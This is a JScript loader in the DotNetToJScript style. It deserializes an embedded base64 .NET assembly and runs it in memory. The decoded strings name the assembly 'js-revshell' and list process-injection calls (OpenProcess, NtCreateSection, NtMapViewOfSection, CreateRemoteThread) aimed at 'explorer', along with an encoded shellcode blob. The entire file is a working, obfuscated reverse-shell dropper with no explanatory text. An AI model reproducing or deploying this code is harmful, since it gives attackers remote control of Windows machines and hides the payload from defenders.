function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABoAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIARFGMsgAAAAAA"+
"AAAA8AAiIAsCMAAAFAAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAYA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBghQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADcLAAA"+
"OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAASBIAAAAgAAAAFAAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAIgDAAAAQAAAAAQAAAAWAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAyCEAABQLAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwCgByAQAAAQAAEQIoEAAA"+
"CiDeBAAAjRQAAAEl0AEAAAQoEQAACgoWEwgrGAYRCAYRCJEfEVkg/wAAAF/SnBEIF1gTCBEIBo5p"+
"MuEWEwkrEgYRCQYRCZEfdGHSnBEJF1gTCREJBo5pMucWEworFwYRCgYRCpEbWSD/AAAAX9KcEQoX"+
"WBMKEQoGjmky4hYTCysSBhELBhELkR95YdKcEQsXWBMLEQsGjmky5waOaWoLfhIAAAoMEgIfDn4S"+
"AAAKEgEfQCAAAAAIfhIAAAooBAAABiYWag1+EgAAChMECCgDAAAGEgR+EgAACn4SAAAKEgMSARgW"+
"GigFAAAGJgYWEQQGjmkoEwAACnIBAABwKBQAAAoWmhMFIP8PHwAWEQVvFQAACigBAAAGEwZ+EgAA"+
"ChMHCBEGEgd+EgAACn4SAAAKEgMSARgWHyAoBQAABiYoAwAABhEEKAYAAAYmCCgHAAAGJhEGfhIA"+
"AAoWEQd+EgAAChZ+EgAACigCAAAGJioAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUA"+
"bAAAAMgDAAAjfgAANAQAADQFAAAjU3RyaW5ncwAAAABoCQAAFAAAACNVUwB8CQAAEAAAACNHVUlE"+
"AAAAjAkAAIgBAAAjQmxvYgAAAAAAAAACAAABV5UCNAkCAAAA+gEzABYAAAEAAAAZAAAABAAAAAEA"+
"AAAIAAAAHgAAABUAAAAQAAAAAQAAAAEAAAACAAAABwAAAAEAAAABAAAAAgAAAAEAAAAAACUDAQAA"+
"AAAABgA0AhgEBgChAhgEBgBoAeYDDwA4BAAABgCQAYADBgAXAoADBgD4AYADBgCIAoADBgBUAoAD"+
"BgBtAoADBgCnAYADBgB8AfkDBgBaAfkDBgDbAYADBgDCAewCBgDyBEEDCgDFBOYDBgA/ARgEBgAe"+
"AUEDBgC/AkEDBgBqBBgEBgAnBUEDBgDHAEEDBgDNA0EDBgAGA/kDAAAAAGEAAAAAAAEAAQABABAA"+
"gAQAAEEAAQABAAABAABqAAAAQQABAAkAFQEAAEIAAABNAAIACQAzAQEAUwAAAAAAgACRIK8EVwAB"+
"AAAAAACAAJEgtABeAAQAAAAAAIAAkSC7BGkACwAAAAAAgACWIEgDbQALAAAAAACAAJYgWAN6ABIA"+
"AAAAAIAAkSBrA4sAHAAAAAAAgACRIDcBkQAeAEggAAAAAIYYxwMGAB8AAAABAJgEAAACAPYAAAAD"+
"AKoAAAABAKYEAAACAEcEAAADAMQCAAAEANkEAAAFALsDAAAGAFoEAAAHAJ8AAAABAJIDAAACAIoE"+
"AAADAHkEAAAEAOQCAAAFABQFAAAGANQDAAAHAAUBAAABANoAAAACAOgAAAADAM0EAAAEAOgEAAAF"+
"ANACAAAGAAYFAAAHANsCAAAIAJoDAAAJACgBAAAKAPkEAAABAJIAAAACALIDAAABAPEECQDHAwEA"+
"EQDHAwYAGQDHAwoAKQDHAxAAMQDHAxAAOQDHAxAAQQDHAxAASQDHAxAAUQDHAxAAWQDHAxAAYQDH"+
"AxUAaQDHAxAAcQDHAxAAeQDHAxAAkQDHAwYAgQDHAwYAqQAdBSsAwQCtAzMAyQAtBTYAiQALAT8A"+
"iQCYAEYALgALAJYALgATAJ8ALgAbAL4ALgAjAMcALgArANgALgAzANgALgA7ANgALgBDAMcALgBL"+
"AN4ALgBTANgALgBbANgALgBjAPYALgBrACABLgBzAC0BQwBbAHsBYwB7AIEBAQDeBAAABAAaAA4D"+
"GwNBAQMArwQBAAABBQC0AAEAQAEHALsEAQAAAQkASAMCAAABCwBYAwIAQAENAGsDAgABAQ8ANwEC"+
"AGgtAAABAASAAAABAAAAAAAAAAAAAAAAADUDAAAEAAAAAAAAAAAAAABKAIkAAAAAAAQAAAAAAAAA"+
"AAAAAEoAQQMAAAAABAADAAAAADgxODY3NEQwOTE2QkZBRkZGMkEzQUQ0MjgwQ0M1NDNFNjg3NjVG"+
"M0FGNEM5QTdGNDlBNjM5QjFDNTU1QTU0MTYAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT0xMjQ2"+
"ADxNb2R1bGU+ADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPgBtc2NvcmxpYgBoUHJvYwBn"+
"ZXRfSWQAbHBUaHJlYWRJZABwcm9jZXNzSWQAQ3JlYXRlUmVtb3RlVGhyZWFkAFJ1bnRpbWVGaWVs"+
"ZEhhbmRsZQBTZWN0aW9uSGFuZGxlAFByb2Nlc3NIYW5kbGUAYkluaGVyaXRIYW5kbGUAaEZpbGUA"+
"R2V0UHJvY2Vzc2VzQnlOYW1lAFZhbHVlVHlwZQBBbGxvY2F0aW9uVHlwZQBOdENsb3NlAENvbXBp"+
"bGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBD"+
"b21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1h"+
"cmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25B"+
"dHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRp"+
"b25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1"+
"Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0"+
"cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAZHdTdGFja1NpemUAQ29t"+
"bWl0U2l6ZQBWaWV3U2l6ZQBNYXhTaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcATWFyc2hh"+
"bABrZXJuZWwzMi5kbGwAbnRkbGwuZGxsAGpzLXJldnNoZWxsLmRsbABqcy1yZXZzaGVsbABTeXN0"+
"ZW0ATnRDcmVhdGVTZWN0aW9uAE50TWFwVmlld09mU2VjdGlvbgBOdFVubWFwVmlld09mU2VjdGlv"+
"bgBTeXN0ZW0uUmVmbGVjdGlvbgBzZWN0aW9uAEluaGVyaXREaXNwb3NpdGlvbgBaZXJvAGJhc2VB"+
"ZGRyAGxwUGFyYW1ldGVyAC5jdG9yAEludFB0cgBhbGxvY2F0aW9uQXR0cmlicwBTeXN0ZW0uRGlh"+
"Z25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNv"+
"bXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGR3Q3JlYXRp"+
"b25GbGFncwBSdW50aW1lSGVscGVycwBwQXR0cnMAVGVzdENsYXNzAGRlc2lyZWRBY2Nlc3MAcHJv"+
"Y2Vzc0FjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBHZXRDdXJyZW50UHJvY2VzcwBCYXNlQWRk"+
"cmVzcwBscFN0YXJ0QWRkcmVzcwBaZXJvQml0cwBoT2JqZWN0AFdpbjMyUHJvdGVjdABTZWN0aW9u"+
"T2Zmc2V0AHBhZ2VQcm90AEluaXRpYWxpemVBcnJheQBDb3B5AAAAABFlAHgAcABsAG8AcgBlAHIA"+
"AADI/cLgpzXjSZ/KtaPH6/vIAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIQBwwdBQoYChgSRRgY"+
"CAgICAcAAgESWRFdAgYYCAAEAR0FCBgIBgABHRJFDgMgAAgIt3pcVhk04IkDBhEQBgADGAkCCAoA"+
"BxgYGAkYGAkYAwAAGAwABwkQGAkYEAoJCRgQAAoJGBgQGBgYEAoQCgkJCQUAAgkYGAQAAQgYCAEA"+
"CAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABABAAtqcy1yZXZz"+
"aGVsbAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyNQAAKQEAJDZhZmFmYjYyLTBmOTItNDE5"+
"MS1hY2E1LTNhY2I3NzcwNzJhMAAADAEABzEuMC4wLjAAAE0BABwuTkVURnJhbWV3b3JrLFZlcnNp"+
"b249djQuNy4yAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRQuTkVUIEZyYW1ld29yayA0LjcuMgUB"+
"AAEAAAQBAAAAAAAAAAAAIfzD/QAAAAACAAAATgAAABQtAAAUDwAAAAAAAAAAAAAAAAAAEAAAAAAA"+
"AAAAAAAAAAAAAFJTRFO8WdXMOYHpSad/M03HeJ1oAQAAAFk6XHNvdXJjZVxqcy1yZXZzaGVsbFxv"+
"YmpceDY0XFJlbGVhc2VcanMtcmV2c2hlbGwucGRiAAAAAAAAAA9TnOcL898bGxtaalprVVNK1Wpm"+
"U5RVe1OUVSNRU5RVO1MguF1dU5R1a15K0lNK279Peo8FPzta2tIeWhra5f5VWmpTlFU7lEVPUxrr"+
"YZqDIxQFIIZ1GxsblJuTGxsbU4bbd2hTGuuUUyNrR5RbO1Ia6/xRXkrSUxDSWpQ3k1Ma0VNK21ra"+
"0h6/WhraQ/t2Cl8cXycTRkLqduNjR5RbJ1Ia62FalB9TR5RbL1Ia61qUB5NaY1Ma61pjaWJtWmNa"+
"YlptU5z/O1pVEPtjWmJtU5QV8lQQEBBuU0rkbFLJeHJ5c3d3ixtaUVOS+lLIxV94IQgQ1mxsU5L6"+
"bG1eStteStJsbFLNBzCuxBsbGxsQ1lKSx/MpGxsbShtCGzUbORtKGzEbQxs5GzcbNhs5GzUbSxtK"+
"GxsbbVOS2lLI28QaGxteStJSzUGkKcUbGxsbENbzIwUbG3Mbdxt3G4sbjBtNG0AbQBtKG0IbNRs5"+
"G0obMRtDGzkbNxs2GzkbNRtLG0obQBtLGzgbXxt+G30bbRtsG3EbcxuKG30beBtRG2sbQRtYG34b"+
"WhtWGzEbbRtoG3YbeBs1G3IbeRt6G3MbVxtZG1cbSxtIG2gbNhtBG1EbeRs1G2UbchuKG2cbixtl"+
"G1QbWhtRG3EbYBt4G1wbeRuDG2EbihteGzEbNRuMG4wbjBs4G2wbjRthG0gbdRtiG4AbfRtwG4Mb"+
"ZRtzG4obXxt5GzUbZRs1G34bXBtIG4MbchtFGzgbVxt3G18bRRteG34bZxtXG3YbZhtMG14bYhtV"+
"G4sbOBuKG10bRxtcG2cbOBtfG3YbXxtYG0obURuLG2UbVxt1GzUbbBtLGzgbdBs+GzgbfhtcG0Yb"+
"dRs3G10bcBteG3QbRRt0G3obcBtrG3UbWRtzG1obcxuCG3EbXBtfG3UbchtDG0UbcxuCG3UbZhs1"+
"G2YbYxtgG1EbdBtfGzUbZxtnG38bcRtmG4IbchuAG3gbVxtYG0sbght8G2YbVRuLG1gbVhtlG40b"+
"MRtoG3Ebchs3G1kbcBs2G3IbQRtRG0MbcRtYG1gbVBs4G3MbVxtXG4AbQhtYG1kbfRt0G1wbXRtS"+
"G1QbWht5G2IbRRuDG10bPhs4G1cbfBtwG0cbXhtWG14bcRtzG1YbSBt5G3EbdhtaG2wbVRtIGxsb"+
"U5LabG1aY16SxlKc2z9eStJsU8jbGxqbG2tsbFLIxaMrzGQQ1lOSwVOc8ztTkuhTkgJSyMU6qBR7"+
"ENaG2yCHfhsbG1OUSBOG23dNU5LiUxDaU9r6O2psa1PDHBsbGxwbGxtrUpL7U5z/O1OS6FKSAl+S"+
"+l+S/VLIxe3u/VIQ1obbdz70FVOUSCuG23c8U5zIE30cY1OSCFKSA30jWmJTkgp9IW1Szexjrtkb"+
"GxsbENZ9HXBTkgp9MG1VcxtMGxtSkvt9B1piUs3sY67ZGxsbGxDWXkrbbG1TkgpeStJsbGxsUs2W"+
"Y8SqGxsbGxDWhtt2H1MQ4HcF9MTzcxsbG1OSCmxtUsjFBpOuixDWhtt38mxifVttUpLq2uUrUsjb"+
"GysbG1LNY6ds5hsbGxsQ1lOsbGxTkuhTkgpTku1SyNsbOxsbUpICUsjFfzIniRDWU5zHO4bbIIew"+
"EBAQYZQIUxrchtt26mPcY30bYsT7Lj0dWpLtENYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEA"+
"AAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAACwDAAAAAAAAAAAAACwDNAAAAFYAUwBf"+
"AFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAA"+
"AAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAk"+
"AAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASMAgAAAQBTAHQAcgBpAG4AZwBGAGkA"+
"bABlAEkAbgBmAG8AAABoAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0"+
"AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAQAAMAAEARgBpAGwA"+
"ZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGoAcwAtAHIAZQB2AHMAaABlAGwAbAAAADAACAAB"+
"AEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAEAAEAABAEkAbgB0AGUA"+
"cgBuAGEAbABOAGEAbQBlAAAAagBzAC0AcgBlAHYAcwBoAGUAbABsAC4AZABsAGwAAABIABIAAQBM"+
"AGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIA"+
"MAAyADUAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEgAEAAB"+
"AE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABqAHMALQByAGUAdgBzAGgAZQBsAGwA"+
"LgBkAGwAbAAAADgADAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAagBzAC0AcgBlAHYAcwBo"+
"AGUAbABsAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4A"+
"MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAw"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}